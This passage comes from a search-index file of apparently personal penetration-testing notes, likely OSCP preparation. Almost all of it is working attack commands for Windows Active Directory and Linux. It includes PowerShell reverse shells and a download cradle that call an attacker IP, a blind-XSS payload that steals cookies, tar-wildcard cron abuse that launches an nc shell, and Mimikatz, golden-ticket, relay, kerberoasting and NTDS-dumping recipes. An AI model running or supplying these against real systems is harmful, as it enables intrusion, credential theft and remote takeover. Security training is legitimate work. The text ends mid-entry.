https://portswigger.net/web-security/sql-injection</p>"},{"location":"EXPLOITATION/WEB/WEB%20ROOTS/","title":"WEB ROOTS","text":"Web Server Default Webroot <code>Apache</code> /var/www/html/ <code>Nginx</code> /usr/local/nginx/html/ <code>IIS</code> c:\\inetpub\\wwwroot| <code>XAMPP</code> C:\\xampp\\htdocs|"},{"location":"EXPLOITATION/WEB/XSS/","title":"XSS","text":"<pre><code>&lt;img src='#' onerror=alert(1) /&gt;\n\n&lt;?php echo 'test@test.test' ?&gt;\n</code></pre> <p>blind xss</p> <pre><code>&lt;img src=\"http://[ip]:[port]\" /&gt;\n\n&lt;img src=\"http://[ip]:[port]?cookie=' + document.cookie + '\" /&gt;\n\n</code></pre>"},{"location":"LATERAL%20MOVEMENT/AD/DCOM/","title":"DCOM","text":""},{"location":"LATERAL%20MOVEMENT/AD/DCOM/#powershell","title":"powershell","text":"<pre><code>$dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID(\"MMC20.Application.1\",\"[ip]\"))\n\n$dcom.Document.ActiveView.ExecuteShellCommand(\"cmd\",$null,\"/c calc\",\"7\")\n\n\n# DCOM\n$dcom.Document.ActiveView.ExecuteShellCommand(\"powershell\",$null,\"powershell -nop -w hidden -e [encoded payload]\",\"7\")\n</code></pre>"},{"location":"LATERAL%20MOVEMENT/AD/MIMIKATZ/","title":"MIMIKATZ","text":""},{"location":"LATERAL%20MOVEMENT/AD/MIMIKATZ/#escalate","title":"escalate","text":"<pre><code>privilege::debug\ntoken::elevate\n</code></pre>"},{"location":"LATERAL%20MOVEMENT/AD/MIMIKATZ/#sam","title":"sam","text":"<pre><code>1. from cmd/powershell dumb sam and secureity files\nreg save hklm\\sam sam.hiv\nreg save hklm\\security security.hiv\n\n2. start mimikatz then escelate\nprivilege::debug\ntoken::elevate\n\n3. log output\nlog hash.txt\n\n4. dump hashes\nlsadump::sam sam.hiv security.hiv\n</code></pre>"},{"location":"LATERAL%20MOVEMENT/AD/MIMIKATZ/#other_passwords","title":"other_passwords","text":"<pre><code>sekurlsa::logonpasswords      # privilege::debug required\nlsadump::cache\nlsadump::sam                  # token::elevate + privilege::debug required\nlsadump::lsa /patch           # privilege::debug required\n![[Pasted image 20230512010509.png]]```\n\n#tickets\n```sh\nsekurlsa::tickets /export\nkerberos::list /export\n</code></pre>"},{"location":"LATERAL%20MOVEMENT/AD/MIMIKATZ/#pass_the_hash","title":"pass_the_hash","text":"<pre><code>sekurlsa::pth /user:[username] /domain:[domain] /ntlm:[hash] /run:[command]\n</code></pre>"},{"location":"LATERAL%20MOVEMENT/AD/MIMIKATZ/#golden_ticket","title":"golden_ticket","text":"<pre><code>lsadump::lsa /inject /name:krbtgt\nkerberos::golden /domain:[domain] /sid:[sid of user forging the ticket] /rc4:[hash] /user:[any user] /id:500 /ptt\n</code></pre> <p>[[GOLDEN TICKET]]</p>"},{"location":"LATERAL%20MOVEMENT/AD/MIMIKATZ/#misc","title":"misc","text":"<pre><code>misc::cmd\n</code></pre>"},{"location":"LATERAL%20MOVEMENT/AD/NETNTLMV2/","title":"NETNTLMV2","text":""},{"location":"LATERAL%20MOVEMENT/AD/NETNTLMV2/#responder","title":"responder","text":"<pre><code>sudo responder -I -A tun0\n\n# NETNTLMV2\n</code></pre>"},{"location":"LATERAL%20MOVEMENT/AD/NETNTLMV2/#crack","title":"crack","text":"<pre><code>hashcat -m 5600 [hash file] /usr/share/wordlists/rockyou.txt --force\n</code></pre>"},{"location":"LATERAL%20MOVEMENT/AD/NETNTLMV2/#relay","title":"relay","text":"<pre><code>sudo impacket-ntlmrelayx --no-http-server -smb2support -t [ip] -c \"powershell -enc JABjAGwAaQBlAG4AdA...\"\n</code></pre>"},{"location":"LATERAL%20MOVEMENT/AD/OVERPASS%20THE%20HASH/","title":"OVERPASS THE HASH","text":""},{"location":"LATERAL%20MOVEMENT/AD/OVERPASS%20THE%20HASH/#mimikatz","title":"mimikatz","text":"<pre><code>sekurlsa::pth /user:[user] /domain:[domain] /ntlm:[ntlm hash] /run:powershell\n\n# OVERPASS THE HASH\n\n# to abuse use anything that uses kerberos tickets, for example\ncd C:\\tools\\SysinternalsSuite\\\n.\\PsExec.exe \\\\[host] cmd\n    whoami\n        [domain]\\[user]\n    hostname\n        [hostname]\n\n</code></pre>"},{"location":"LATERAL%20MOVEMENT/AD/PASS%20THE%20HASH/","title":"PASS THE HASH","text":""},{"location":"LATERAL%20MOVEMENT/AD/PASS%20THE%20HASH/#smbclient","title":"smbclient","text":"<pre><code>smbclient \\\\\\\\[ip]\\\\secrets -U [username] --pw-nt-hash [hash]\n</code></pre>"},{"location":"LATERAL%20MOVEMENT/AD/PASS%20THE%20HASH/#psexec","title":"psexec","text":"<pre><code># PASS THE HASH\n\nimpacket-psexec -hashes 00000000000000000000000000000000:[hash] [user]@[ip]\n</code></pre> <p><code>00000000000000000000000000000000:[some hash]</code> null value for LM part of hash when applicable </p>"},{"location":"LATERAL%20MOVEMENT/AD/PASS%20THE%20HASH/#wmiexec","title":"wmiexec","text":"<p>```</p>"},{"location":"LATERAL%20MOVEMENT/AD/PASS%20THE%20HASH/#gives-you-shell-as-user-authenticated-with","title":"gives you shell as user authenticated with","text":"<p>impacket-wmiexec -hashes 00000000000000000000000000000000:[hash] [user]@[ip]</p> <p>/usr/bin/impacket-wmiexec -hashes :[hash] [user]@[ip]</p>"},{"location":"LATERAL%20MOVEMENT/AD/PASS%20THE%20TICKET/","title":"PASS THE TICKET","text":""},{"location":"LATERAL%20MOVEMENT/AD/PASS%20THE%20TICKET/#mimikatz","title":"mimikatz","text":"<pre><code>privilege::debug\nsekurlsa::tickets /export\nkerberos::ptt [0;12bd0]-0-0-40810000-joe@cifs-server.kirbi\n\nklist\nls \\\\[server]\\backup\n</code></pre>"},{"location":"LATERAL%20MOVEMENT/AD/PSEXEC/","title":"PSEXEC","text":"<pre><code>./PsExec64.exe -i  \\\\[host] -u [domain]\\[user] -p [password] cmd\n\n-s run process as system\n</code></pre>"},{"location":"LATERAL%20MOVEMENT/AD/RELAY/","title":"RELAY","text":""},{"location":"LATERAL%20MOVEMENT/AD/RELAY/#impacket_ntlmrelayx","title":"impacket_ntlmrelayx","text":"<pre><code>sudo impacket-ntlmrelayx --no-http-server -smb2support -t [ip] -c \"powershell -enc JABjAGwAaQBlAG4AdA...\"\n</code></pre>"},{"location":"LATERAL%20MOVEMENT/AD/REVERSE%20SHELL/","title":"REVERSE SHELL","text":""},{"location":"LATERAL%20MOVEMENT/AD/REVERSE%20SHELL/#powershell","title":"powershell","text":"<pre><code>$client = New-Object System.Net.Sockets.TCPClient(\"[atacker ip]\",[attacker listening port);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&gt;&amp;1 | Out-String );$sendback2 = $sendback + \"PS \" + (pwd).Path + \"&gt; \";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\n\n\nbase64 encode\n\n$text = '[commands here]'\n$Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)                                                                                                                                                                                                         $EncodedText =[Convert]::ToBase64String($Bytes)                                                                                                                                                                                                                 $EncodedText\n\n\ncurl http://[ip]/[some]/[location]/simple-backdoor.pHP?cmd=powershell%20-enc%20[base 64 encoded string]\n\npHP to bypass case sensitive prevention\n</code></pre>"},{"location":"LATERAL%20MOVEMENT/AD/REVERSE%20SHELL/#powercat","title":"powercat","text":"<pre><code>powershell -c \"IEX (New-Object System.Net.Webclient).DownloadString('http://[attacker ip]:[attacker http port]/powercat.ps1');powercat -c [attacker ip] -p [attacker listener port] -e powershell\"\n</code></pre>"},{"location":"LATERAL%20MOVEMENT/AD/REVERSE%20SHELL/#python_helper","title":"python_helper","text":"<pre><code>import sys\nimport base64\n\npayload = '$client = New-Object System.Net.Sockets.TCPClient(\"[attacker ip]\",[attacker listening port]);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&gt;&amp;1 | Out-String );$sendback2 = $sendback + \"PS \" + (pwd).Path + \"&gt; \";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'\n\ncmd = \"powershell -nop -w hidden -e \" + base64.b64encode(payload.encode('utf16')[2:]).decode()\n\nprint(cmd)\n</code></pre>"},{"location":"LATERAL%20MOVEMENT/AD/REVERSE%20SHELL/#winrs","title":"winrs","text":"<pre><code>winrs -r:[remote host] -u:[user] -p:[password]  \"powershell -nop -w hidden -e [encoded payload]\"\n</code></pre>"},{"location":"LATERAL%20MOVEMENT/AD/WINRM/","title":"WINRM","text":""},{"location":"LATERAL%20MOVEMENT/AD/WINRM/#evil-winrm","title":"evil-winrm","text":""},{"location":"LATERAL%20MOVEMENT/AD/WINRM/#winrs","title":"winrs","text":"<pre><code>winrs -r:[remote host] -u:[user] -p:[password]  \"cmd /c hostname &amp; whoami\"\n\n# WINRM\nwinrs -r:[remote host] -u:[user] -p:[password]  \"powershell -nop -w hidden -e [encoded payload]\"\n</code></pre>"},{"location":"LATERAL%20MOVEMENT/AD/WINRM/#pssession","title":"PSSession","text":"<pre><code>$username = '[user]]';\n$password = '[password]';\n$secureString = ConvertTo-SecureString $password -AsPlaintext -Force;\n$credential = New-Object System.Management.Automation.PSCredential $username, $secureString;\n\nNew-PSSession -ComputerName [ip / host] -Credential $credential\n\nEnter-PSSession 1\n</code></pre>"},{"location":"LATERAL%20MOVEMENT/AD/WMIC/","title":"WMIC","text":""},{"location":"LATERAL%20MOVEMENT/AD/WMIC/#cmd","title":"cmd","text":"<pre><code>wmic /node:[ip] /user:[username] /password:[password] process call create \"[process name]\"\n</code></pre>"},{"location":"LATERAL%20MOVEMENT/AD/WMIC/#powershell","title":"powershell","text":"<pre><code>$username = '[username]';\n$password = '[password]';\n$secureString = ConvertTo-SecureString $password -AsPlaintext -Force;\n$credential = New-Object System.Management.Automation.PSCredential $username, $secureString;\n$options = New-CimSessionOption -Protocol DCOM\n$session = New-Cimsession -ComputerName [ip] -Credential $credential -SessionOption $Options \n$command = [calc];\n\nInvoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine =$Command};\n</code></pre>"},{"location":"LATERAL%20MOVEMENT/AD/WMIC/#python_helper","title":"python_helper","text":"<pre><code>import sys\nimport base64\n\npayload = '$client = New-Object System.Net.Sockets.TCPClient(\"[attacker ip]\",[attacker listening port]);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&gt;&amp;1 | Out-String );$sendback2 = $sendback + \"PS \" + (pwd).Path + \"&gt; \";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'\n\ncmd = \"powershell -nop -w hidden -e \" + base64.b64encode(payload.encode('utf16')[2:]).decode()\n\nprint(cmd)\n</code></pre>"},{"location":"LATERAL%20MOVEMENT/PIVOTS/PORT%20FORWARDING/","title":"PORT FORWARDING","text":"<p>https://github.com/nicocha30/ligolo-ng#how-is-this-different-from-ligolochiselmeterpreter-</p> <p>nmap needs -sT flag for proxychains note to self: my proxychains config has been modified for short timeouts</p>"},{"location":"LATERAL%20MOVEMENT/PIVOTS/PORT%20FORWARDING/#socat","title":"socat","text":"<pre><code>#target system\nsocat -ddd TCP-LISTEN:[port],fork TCP:[ip]:[port]\n\n-ddd                   verbose\nTCP-LISTEN:1234        define listening port\nfork                   do not die after single connection\nTCP:192.168.50.111:1234   forward all traffic to 192.168.50.111:1234\n</code></pre>"},{"location":"LATERAL%20MOVEMENT/PIVOTS/PORT%20FORWARDING/#ssh","title":"ssh","text":"<pre><code>#single port\nssh -N -L 0.0.0.0:[local port]:[remote host]:[remote port] [user]@[remote host]\n\n#dynamic\nssh -N -D 0.0.0.0:[local port] [user]@[remote host]\n</code></pre>"},{"location":"LATERAL%20MOVEMENT/PIVOTS/PORT%20FORWARDING/#proxychains","title":"proxychains","text":"<pre><code>modify /etc/proxychains.conf\nuse chisel if desired\nproxychains [some command]\n</code></pre>"},{"location":"LATERAL%20MOVEMENT/PIVOTS/PORT%20FORWARDING/#chisel","title":"chisel","text":"<pre><code>chisel server -p [chisel server port] --reverse\n\n.\\chisel.exe client [chisel server ip]:[chisel server port] R:socks\n</code></pre>"},{"location":"LATERAL%20MOVEMENT/PIVOTS/PORT%20FORWARDING/#proxychain","title":"proxychain","text":"<pre><code>chisel server -p [chisel server port] --socks5 --reverse\n\n./chisel_1.7.7_linux_amd64 client [chisel server ip]:[chisel server port] R:socks\n\nsudo vi /etc/proxychains.conf\n\nproxychains nmap -A -p[remote port] [remote host ip]\n</code></pre>"},{"location":"LATERAL%20MOVEMENT/PIVOTS/PORT%20FORWARDING/#ssh_windows","title":"ssh_windows","text":"<pre><code>ssh -N -R [port] [attacker username(probably kali)]@[attacker ip]\n</code></pre>"},{"location":"LATERAL%20MOVEMENT/PIVOTS/PORT%20FORWARDING/#netsh","title":"netsh","text":"<p>``` netsh interface portproxy add v4tov4 listenport=[port] listenaddress=0.0.0.0 connectport=[port] connectaddress=[remote ip]</p> <p>netsh advfirewall firewall add rule name=\"[some_logical_name]\" protocol=[TCP/UDP] dir=in localip=[local ip] localport=[some port] action=allow ````</p>"},{"location":"PERSISTENCE/GOLDEN%20TICKET/","title":"GOLDEN TICKET","text":""},{"location":"PERSISTENCE/GOLDEN%20TICKET/#mimikatz","title":"mimikatz","text":"<pre><code>privilege::debug\nlsadump::lsa /patch\n\n#can continue on different system\n\nkerberos::purge\nkerberos::golden /user:[user] /domain:[domain] /sid:[sid of user forging ticket] /krbtgt:[hash] /ptt\n\nmisc::cmd\n\nPsExec.exe \\\\[host] cmd.exe\n</code></pre>"},{"location":"PERSISTENCE/SSH%20KEYS/","title":"SSH KEYS","text":"<pre><code>gyrsec@htb[/htb]$ ssh-keygen -f key\n\nuser@remotehost$ echo \"ssh-rsa AAAAB...SNIP...M= user@parrot\" &gt;&gt; /root/.ssh/authorized_keys\n\ngyrsec@htb[/htb]$ ssh root@[ip] -i key\n</code></pre>"},{"location":"PERSISTENCE/VOLUME%20SHADOW%20COPY/","title":"VOLUME SHADOW COPY","text":""},{"location":"PERSISTENCE/VOLUME%20SHADOW%20COPY/#ntds","title":"NTDS","text":""},{"location":"PERSISTENCE/VOLUME%20SHADOW%20COPY/#cmd","title":"cmd","text":"<pre><code>vshadow.exe -nw -p  C:  # must run cmd as admin\n\ncopy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy2\\windows\\ntds\\ntds.dit c:\\ntds.dit.bak\n\nreg.exe save hklm\\system c:\\system.bak\n\n# VOLUME SHADOW COPY\n</code></pre>"},{"location":"PERSISTENCE/VOLUME%20SHADOW%20COPY/#impacket-secretsdump","title":"impacket-secretsdump","text":"<pre><code>impacket-secretsdump -ntds ntds.dit.bak -system system.bak LOCAL\n</code></pre>"},{"location":"PRIVILEGE%20ESCALATION/AD/AS-REP%20ROASTING/","title":"AS-REP ROASTING","text":""},{"location":"PRIVILEGE%20ESCALATION/AD/AS-REP%20ROASTING/#impacket-getnpusers","title":"impacket-GetNPUsers","text":"<pre><code># AS-REP ROASTING\n\nimpacket-GetNPUsers -dc-ip [ip] -request -outputfile [hashes file] [domain]/[username]\n</code></pre>"},{"location":"PRIVILEGE%20ESCALATION/AD/AS-REP%20ROASTING/#crack","title":"crack","text":"<pre><code>hashcat --help | grep -i \"Kerberos\"\n\nsudo hashcat -m 18200 [hashes file] /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force\n</code></pre>"},{"location":"PRIVILEGE%20ESCALATION/AD/AS-REP%20ROASTING/#rubeus","title":"rubeus","text":"<pre><code>.\\Rubeus.exe asreproast /nowrap\n</code></pre>"},{"location":"PRIVILEGE%20ESCALATION/AD/AS-REP%20ROASTING/#powerview","title":"powerview","text":"<pre><code>Get-DomainUser with -PreauthNotRequired\n</code></pre>"},{"location":"PRIVILEGE%20ESCALATION/AD/AS-REP%20ROASTING/#targeted_as-rep_roasting","title":"Targeted_AS-REP_Roasting","text":"<pre><code>with GenericWrite or GenericAll modify the User Account Control value of the user to not require Kerberos preauthentication\n</code></pre>"},{"location":"PRIVILEGE%20ESCALATION/AD/CACHED%20PASSWORDS/","title":"CACHED PASSWORDS","text":""},{"location":"PRIVILEGE%20ESCALATION/AD/CACHED%20PASSWORDS/#mimikatz","title":"mimikatz","text":"<pre><code># CACHED PASSWORDS\nprivilege::debug\n\n# dump hashes of logged in users\nsekurlsa::logonpasswords\n\n# show tickets in memory\nsekurlsa::tickets\n\n# fix non exportable certs on CA\ncrypto::capi\nKeyIso\n</code></pre>"},{"location":"PRIVILEGE%20ESCALATION/AD/DCSYNC/","title":"DCSYNC","text":""},{"location":"PRIVILEGE%20ESCALATION/AD/DCSYNC/#mimikatz","title":"mimikatz","text":"<pre><code>lsadump::dcsync /user:[domain]\\[user]\n</code></pre>"},{"location":"PRIVILEGE%20ESCALATION/AD/DCSYNC/#impacket-secretsdumps","title":"impacket-secretsdumps","text":"<pre><code>impacket-secretsdump -just-dc-user krbtgt [domain]/[user]:\"[password]\"@[ip]\n</code></pre>"},{"location":"PRIVILEGE%20ESCALATION/AD/DCSYNC/#crack","title":"crack","text":"<pre><code>hashcat -m 1000 [dcsync hashes file] /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force\n</code></pre>"},{"location":"PRIVILEGE%20ESCALATION/AD/ENUM/","title":"ENUM","text":"<p>https://gyrsec.github.io/ENUMERATION/AD</p>"},{"location":"PRIVILEGE%20ESCALATION/AD/KERBEROASTING/","title":"KERBEROASTING","text":""},{"location":"PRIVILEGE%20ESCALATION/AD/KERBEROASTING/#rubeus","title":"rubeus","text":"<pre><code>.\\Rubeus.exe kerberoast /outfile:hashes.kerberoast\n</code></pre>"},{"location":"PRIVILEGE%20ESCALATION/AD/KERBEROASTING/#powershell","title":"powershell","text":"<pre><code>Add-Type -AssemblyName System.IdentityModel\nNew-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList \"MSSQL/MS02.oscp.exam\"\n</code></pre>"},{"location":"PRIVILEGE%20ESCALATION/AD/KERBEROASTING/#crack","title":"crack","text":"<pre><code>sudo hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force\n</code></pre>"},{"location":"PRIVILEGE%20ESCALATION/AD/KERBEROASTING/#impacket-getuserspns","title":"impacket-GetUserSPNs","text":"<pre><code>sudo impacket-GetUserSPNs -request -dc-ip [ip] [domain]/[user]\n\nIf we get the error \"KRB_AP_ERR_SKEW(Clock skew too great), use: ntpdate [server]\" \n</code></pre>"},{"location":"PRIVILEGE%20ESCALATION/AD/KERBEROASTING/#targeted_kerberoasting","title":"targeted_kerberoasting","text":"<pre><code>with GenericWrite or GenericAll set an SPN then kerberoast\n</code></pre>"},{"location":"PRIVILEGE%20ESCALATION/AD/PASSWORD%20ATTACKS/","title":"PASSWORD ATTACKS","text":""},{"location":"PRIVILEGE%20ESCALATION/AD/PASSWORD%20ATTACKS/#password_policies","title":"password_policies","text":"<pre><code>net accounts\n</code></pre>"},{"location":"PRIVILEGE%20ESCALATION/AD/PASSWORD%20ATTACKS/#spray_directoryentry","title":"spray_DirectoryEntry","text":"<pre><code># PASSWORD ATTACKS\n\n$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()\n$PDC = ($domainObj.PdcRoleOwner).Name\n$SearchString = \"LDAP://\"\n$SearchString += $PDC + \"/\"\n$DistinguishedName = \"DC=$($domainObj.Name.Replace('.', ',DC='))\"\n$SearchString += $DistinguishedName\nNew-Object System.DirectoryServices.DirectoryEntry($SearchString, \"[user]\", \"[password]\")\n\n# If the password for the user account is correct, the object creation will be successful\n</code></pre>"},{"location":"PRIVILEGE%20ESCALATION/AD/PASSWORD%20ATTACKS/#spray_crackmapexec","title":"spray_crackmapexec","text":"<pre><code># slow and noisy, can lock accounts\n\ncrackmapexec smb [ip] -u [users file] -p '[password]' -d [domain] --continue-on-success\n</code></pre>"},{"location":"PRIVILEGE%20ESCALATION/AD/PASSWORD%20ATTACKS/#spray_request_tgt","title":"spray_request_TGT","text":"<pre><code>kinit\n\nkerbrute\n.\\kerbrute_windows_amd64.exe passwordspray -d [domain] [usernames file] \"[password]\"\n\nusers file must be saved as ANSI\n</code></pre>"},{"location":"PRIVILEGE%20ESCALATION/AD/SILVER%20TICKET/","title":"SILVER TICKET","text":""},{"location":"PRIVILEGE%20ESCALATION/AD/SILVER%20TICKET/#requirements","title":"requirements","text":"<pre><code>-   SPN password hash\n-   Domain SID\n-   Target SPN\n</code></pre>"},{"location":"PRIVILEGE%20ESCALATION/AD/SILVER%20TICKET/#service_hash","title":"service_hash","text":"<pre><code>#mimikatz \n\nprivilege::debug\nsekurlsa::logonpasswords\n</code></pre>"},{"location":"PRIVILEGE%20ESCALATION/AD/SILVER%20TICKET/#domain_sid","title":"domain_sid","text":"<pre><code>whoami /user\n</code></pre>"},{"location":"PRIVILEGE%20ESCALATION/AD/SILVER%20TICKET/#target_sid","title":"target_sid","text":"<pre><code># SILVER TICKET\nHTTP SPN resource on WEB04 (HTTP/web04.corp.com:80)\n</code></pre>"},{"location":"PRIVILEGE%20ESCALATION/AD/SILVER%20TICKET/#create_ticket","title":"create_ticket","text":"<pre><code>kerberos::golden /sid:[sid of user forging ticket] /domain:[domain] /ptt /target:[host FQDN] /service:http /rc4:[hash] /user:[user]\n\nconfirm with klist\n\niwr -UseDefaultCredentials http://[host]\n</code></pre>"},{"location":"PRIVILEGE%20ESCALATION/GENERAL/KEEPASS%20DATABASE/","title":"KEEPASS DATABASE","text":""},{"location":"PRIVILEGE%20ESCALATION/GENERAL/KEEPASS%20DATABASE/#extract_hash","title":"extract_hash","text":"<p><code>keepass2john ./Database.kdbx &gt; Keepasshash.txt</code></p>"},{"location":"PRIVILEGE%20ESCALATION/GENERAL/KEEPASS%20DATABASE/#john","title":"john","text":"<p><code>john --wordlist=/usr/share/wordlists/rockyou.txt Keepasshash.txt</code></p>"},{"location":"PRIVILEGE%20ESCALATION/GENERAL/KEEPASS%20DATABASE/#hashcat","title":"hashcat","text":"<pre><code>remove db name from Keepasshash.txt\nhashcat -m 13400 -a 0 ./Keepasshash.txt ~/wordlists/rockyou.txt\n</code></pre>"},{"location":"PRIVILEGE%20ESCALATION/GENERAL/UPGRADE%20SHELL/","title":"UPGRADE SHELL","text":""},{"location":"PRIVILEGE%20ESCALATION/GENERAL/UPGRADE%20SHELL/#python","title":"python","text":"<ul> <li>Spawning bash with python:</li> </ul> <pre><code>python -c 'import pty; pty.spawn(\"/bin/bash\")'\npython3 -c 'import pty; pty.spawn(\"/bin/bash\")'\n</code></pre> <ul> <li>Backgrounding the remote shell with CTRL-Z:</li> </ul> <pre><code>user@remote:~$ ^Z\n</code></pre> <ul> <li>Getting ROWS and COLS within current terminal window:</li> </ul> <pre><code>user@local:~$ stty -a | head -n1 | cut -d ';' -f 2-3 | cut -b2- | sed 's/; /\\n/'\n</code></pre> <ul> <li>Ignoring hotkeys in the local shell and getting back to the remote:</li> </ul> <pre><code>user@local:~$ stty raw -echo; fg\n</code></pre> <ul> <li>Setting correct size for the remote shell (where <code>ROWS</code> and <code>COLS</code> are the values from the 3rd bullet):</li> </ul> <pre><code>user@remote:~$ stty rows ROWS cols COLS\n</code></pre> <ul> <li>Adding some colors:</li> </ul> <pre><code>user@remote:~$ export TERM=xterm-256color\n</code></pre> <ul> <li>Reloading bash to apply the TERM variable:</li> </ul> <pre><code>user@remote:~$ exec /bin/bash\n</code></pre> <p>src: slightly modified from snovvcrash</p>"},{"location":"PRIVILEGE%20ESCALATION/OS/LINUX/AUTO%20ENUM/","title":"AUTO ENUM","text":""},{"location":"PRIVILEGE%20ESCALATION/OS/LINUX/AUTO%20ENUM/#unix_privesc_check","title":"unix_privesc_check","text":"<pre><code>./unix-privesc-check standard &gt; output.txt\n</code></pre>"},{"location":"PRIVILEGE%20ESCALATION/OS/LINUX/AUTO%20ENUM/#linux_exploit_suggester","title":"linux_exploit_suggester","text":"<pre><code>./lse -l 2\n</code></pre>"},{"location":"PRIVILEGE%20ESCALATION/OS/LINUX/BIND%20SHELL/","title":"BIND SHELL","text":"<pre><code>rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2&gt;&amp;1|nc -lvp [listen port] &gt;/tmp/f\n</code></pre> <pre><code>python -c 'exec(\"\"\"import socket as s,subprocess as sp;s1=s.socket(s.AF_INET,s.SOCK_STREAM);s1.setsockopt(s.SOL_SOCKET,s.SO_REUSEADDR, 1);s1.bind((\"0.0.0.0\",[listen port]));s1.listen(1);c,a=s1.accept();\\nwhile True: d=c.recv(1024).decode();p=sp.Popen(d,shell=True,stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE);c.sendall(p.stdout.read()+p.stderr.read())\"\"\")'\n</code></pre> <pre><code>powershell -NoP -NonI -W Hidden -Exec Bypass -Command $listener = [System.Net.Sockets.TcpListener]&lt;port&gt;; $listener.start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&gt;&amp;1 | Out-String );$sendback2 = $sendback + \"PS \" + (pwd).Path + \" \";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();\n</code></pre>"},{"location":"PRIVILEGE%20ESCALATION/OS/LINUX/BRUTE%20FORCE/","title":"BRUTE FORCE","text":""},{"location":"PRIVILEGE%20ESCALATION/OS/LINUX/BRUTE%20FORCE/#crunch","title":"crunch","text":"<pre><code>crunch 6 6 -t Lab%%% &gt; wordlist\ncrunch [min chars] [max chars] -t [pattern] &gt; [outfile]\n</code></pre>"},{"location":"PRIVILEGE%20ESCALATION/OS/LINUX/BRUTE%20FORCE/#hydra","title":"hydra","text":"<pre><code>hydra -l [username] -P wordlist [ip] -t 4 ssh -V\n</code></pre>"},{"location":"PRIVILEGE%20ESCALATION/OS/LINUX/CAPABILITIES/","title":"CAPABILITIES","text":""},{"location":"PRIVILEGE%20ESCALATION/OS/LINUX/CAPABILITIES/#enum","title":"enum","text":"<pre><code>/usr/sbin/getcap -r / 2&gt;/dev/null\n</code></pre>"},{"location":"PRIVILEGE%20ESCALATION/OS/LINUX/CAPABILITIES/#exploit","title":"exploit","text":"<p>https://gtfobins.github.io/</p>"},{"location":"PRIVILEGE%20ESCALATION/OS/LINUX/CRONJOB/","title":"CRONJOB","text":""},{"location":"PRIVILEGE%20ESCALATION/OS/LINUX/CRONJOB/#tar","title":"tar","text":"<p><code>`` echo \"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1| nc [ip] [port] &gt;/tmp/f\" &gt; shell.sh echo \"\" &gt; \"--checkpoint-action=exec=sh shell.sh\" echo \"\" &gt; --checkpoint=1</code></p>"},{"location":"PRIVILEGE%20ESCALATION/OS/LINUX/CRONTAB/","title":"CRONTAB","text":""},{"location":"PRIVILEGE%20ESCALATION/OS/LINUX/CRONTAB/#enum","title":"enum","text":"<ul> <li><code>/etc/crontab</code></li> <li><code>/etc/cron.d</code></li> <li><code>/var/spool/cron/crontabs/root</code></li> </ul> <pre><code>cat /etc/crontab\ncrontab -l\ngrep \"CRON\" /var/log/syslog\n</code></pre>"},{"location":"PRIVILEGE%20ESCALATION/OS/LINUX/DOCKER%20BREAKOUT/","title":"DOCKER BREAKOUT","text":"<p>Am I in a container https://stackoverflow.com/questions/23513045/how-to-check-if-a-process-is-running-inside-docker-container</p> <pre><code>#!/bin/bash\nif [ -f /.dockerenv ]; then\n    echo \"I'm inside matrix ;(\";\nelse\n    echo \"I'm living in real world!\";\nfi\n</code></pre> <p>https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-security/docker-breakout-privilege-escalation</p> <p></p> <p>Privilege Escalation with 2 shells</p> <p>If you have access as root inside a container and you have escaped as a non privileged user to the host, you can abuse both shells to privesc inside the host if you have the capability MKNOD inside the container (it's by default) as explained in this post. With such capability the root user within the container is allowed to create block device files. Device files are special files that are used to access underlying hardware &amp; kernel modules. For example, the /dev/sda block device file gives access to read the raw data on the systems disk.</p> <p>Docker safeguards against block device misuse within containers by enforcing a cgroup policy that blocks block device read/write operations. Nevertheless, if a block device is created inside the container, it becomes accessible from outside the container via the /proc/PID/root/ directory. This access requires the process owner to be the same both inside and outside the container.</p> <p>Exploitation example from this writeup:</p> <pre><code># DOCKER BREAKOUT\ncd /\n# Crate device\nmknod sda b 8 0\n# Give access to it\nchmod 777 sda\n\n# Create the nonepriv user of the host inside the container\n## In this case it's called augustus (like the user from the host)\necho \"john:x:1001:1001:john,,,:/home/john:/bin/bash\" &gt;&gt; /etc/passwd\n# Get a shell as augustus inside the container\nsu augustus\nsu: Authentication failure\n(Ignored)\naugustus@3a453ab39d3d:/backend$ 